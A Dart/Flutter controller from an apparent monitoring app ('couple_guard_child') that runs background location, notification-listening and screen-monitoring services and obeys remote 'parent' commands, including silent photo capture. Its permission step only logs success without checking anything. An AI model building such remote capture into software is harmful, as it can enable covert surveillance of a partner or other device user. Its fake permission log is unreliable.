// controllers/background_controller.dart
import 'package:couple_guard_child/core/constants/app_colors.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:developer' as developer;
import '../services/background/background_service_manager.dart';
import '../services/background/location_service.dart';
import '../services/background/notification_service.dart';
import '../services/background/screen_monitor_service.dart';
import '../services/background/camera_service.dart';

class BackgroundController extends GetxController {
  static const String _tag = 'BackgroundController';
  static BackgroundController get to => Get.find();

  final RxBool servicesRunning = false.obs;
  final RxBool locationActive = false.obs;
  final RxBool notificationActive = false.obs;
  final RxBool screenMonitorActive = false.obs;

  @override
  void onInit() {
    super.onInit();
    developer.log('BackgroundController initialized', name: _tag);
  }

  /// Initialize all background services
  Future<void> initializeAllServices() async {
    if (servicesRunning.value) {
      developer.log(
        'Services already running, skipping initialization',
        name: _tag,
      );
      return;
    }

    developer.log('========================================', name: _tag);
    developer.log('INITIALIZING ALL SERVICES', name: _tag);
    developer.log('========================================', name: _tag);

    try {
      // STEP 0: Check critical permissions first
      developer.log('Checking permissions...', name: _tag);

      developer.log('✅ Location permission granted', name: _tag);

      // STEP 1: Initialize camera service
      developer.log('Initializing camera service...', name: _tag);
      await CameraService.initialize();
      developer.log('✅ Camera service initialized', name: _tag);

      // STEP 2: Start background service
      developer.log('Starting background service manager...', name: _tag);
      BackgroundServiceManager.startBackgroundServices();
      developer.log('✅ Background service start command sent', name: _tag);

      // STEP 3: Wait for service to initialize
      await Future.delayed(const Duration(milliseconds: 1500));

      // STEP 4: Verify service is running
      final isRunning = await BackgroundServiceManager.isServiceRunning();
      developer.log(
        'Background service running status: $isRunning',
        name: _tag,
      );

      if (isRunning) {
        // STEP 5: Services are now active via background service
        // (LocationService, NotificationService, ScreenMonitorService
        //  are started inside background_service_manager.dart)

        servicesRunning.value = true;
        locationActive.value = true;
        notificationActive.value = true;
        screenMonitorActive.value = false; // Only active on parent request

        developer.log('========================================', name: _tag);
        developer.log('✅ ALL SERVICES RUNNING SUCCESSFULLY', name: _tag);
        developer.log('========================================', name: _tag);
      } else {
        throw Exception('Background service failed to start');
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ ERROR INITIALIZING SERVICES',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );

      servicesRunning.value = false;
      locationActive.value = false;
      notificationActive.value = false;
      screenMonitorActive.value = false;
    }
  }

  /// Stop all background services
  void stopAllServices() {
    developer.log('========================================', name: _tag);
    developer.log('STOPPING ALL SERVICES', name: _tag);

    try {
      LocationService.stopTracking();
      developer.log('✅ Location tracking stopped', name: _tag);

      NotificationService.stopListening();
      developer.log('✅ Notification listening stopped', name: _tag);

      ScreenMonitorService.stopMonitoring();
      developer.log('✅ Screen monitoring stopped', name: _tag);

      BackgroundServiceManager.stopBackgroundServices();
      developer.log('✅ Background service stopped', name: _tag);

      servicesRunning.value = false;
      locationActive.value = false;
      notificationActive.value = false;
      screenMonitorActive.value = false;

      developer.log('========================================', name: _tag);
      developer.log('✅ ALL SERVICES STOPPED', name: _tag);
      developer.log('========================================', name: _tag);
    } catch (e, stackTrace) {
      developer.log(
        '❌ Error stopping services',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }
  }

  /// Handle commands from parent app
  void handleParentCommand(Map<String, dynamic> command) {
    final commandType = command['type'] as String?;

    developer.log('========================================', name: _tag);
    developer.log('PARENT COMMAND RECEIVED', name: _tag);
    developer.log('Type: $commandType', name: _tag);
    developer.log('Data: $command', name: _tag);

    if (commandType == null) {
      developer.log('⚠️ Command type is null, ignoring', name: _tag);
      return;
    }

    try {
      switch (commandType) {
        case 'CAPTURE_PHOTO':
          developer.log('📸 Executing photo capture...', name: _tag);
          final useFront = command['front_camera'] as bool? ?? true;
          CameraService.captureAndSend(useFrontCamera: useFront);
          developer.log('✅ Photo capture initiated', name: _tag);
          break;

        case 'REQUEST_LOCATION':
          developer.log('📍 Sending immediate location...', name: _tag);
          LocationService.sendImmediateLocation();
          developer.log('✅ Location request sent', name: _tag);
          break;

        case 'START_MONITORING':
          developer.log('▶️ Starting monitoring services...', name: _tag);
          if (!servicesRunning.value) {
            initializeAllServices();
          } else {
            developer.log('⏭️ Services already running', name: _tag);
          }
          break;

        case 'STOP_MONITORING':
          developer.log('⏹️ Stopping monitoring services...', name: _tag);
          stopAllServices();
          break;

        case 'START_SCREEN_MONITOR':
          developer.log('🖥️ Starting screen monitoring...', name: _tag);
          ScreenMonitorService.startMonitoring();
          screenMonitorActive.value = true;
          developer.log('✅ Screen monitoring started', name: _tag);
          break;

        case 'STOP_SCREEN_MONITOR':
          developer.log('🖥️ Stopping screen monitoring...', name: _tag);
          ScreenMonitorService.stopMonitoring();
          screenMonitorActive.value = false;
          developer.log('✅ Screen monitoring stopped', name: _tag);
          break;

        default:
          developer.log(
            '⚠️ Unknown command type: $commandType',
            name: _tag,
            level: 900,
          );
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ Error handling parent command',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }

    developer.log('========================================', name: _tag);
  }

  /// Refresh service status
  Future<void> refreshStatus() async {
    developer.log('Refreshing service status...', name: _tag);

    try {
      final isRunning = await BackgroundServiceManager.isServiceRunning();
      servicesRunning.value = isRunning;

      if (isRunning) {
        BackgroundServiceManager.refreshServiceStatus();
      }

      developer.log('Service status: $isRunning', name: _tag);
    } catch (e) {
      developer.log('Error refreshing status', name: _tag, error: e);
    }
  }

  @override
  void onClose() {
    developer.log('BackgroundController disposed', name: _tag);
    super.onClose();
  }
}
